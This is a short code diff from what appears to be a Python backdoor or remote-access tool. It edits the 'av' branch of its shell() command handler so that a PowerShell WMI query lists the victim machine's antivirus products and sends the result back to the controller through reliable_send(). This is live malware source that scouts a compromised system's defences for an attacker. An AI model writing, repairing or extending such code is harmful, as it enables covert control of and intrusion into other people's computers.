@@ -361,9 +361,13 @@ def shell():
 
         elif command == 'av':
             try:
-              execute = subprocess.run(["Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+                execute = subprocess.run(['powershell', 'Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct'], shell=True, stdout=subprocess.PIPE, 
+                                         stderr=subprocess.PIPE,
+                                   stdin=subprocess.PIPE)
+                result = execute.stdout + execute.stderr
+                result = result.decode()
                 #print(result)
-              reliable_send(result)
+                reliable_send(result)
             except:
                 pass
 
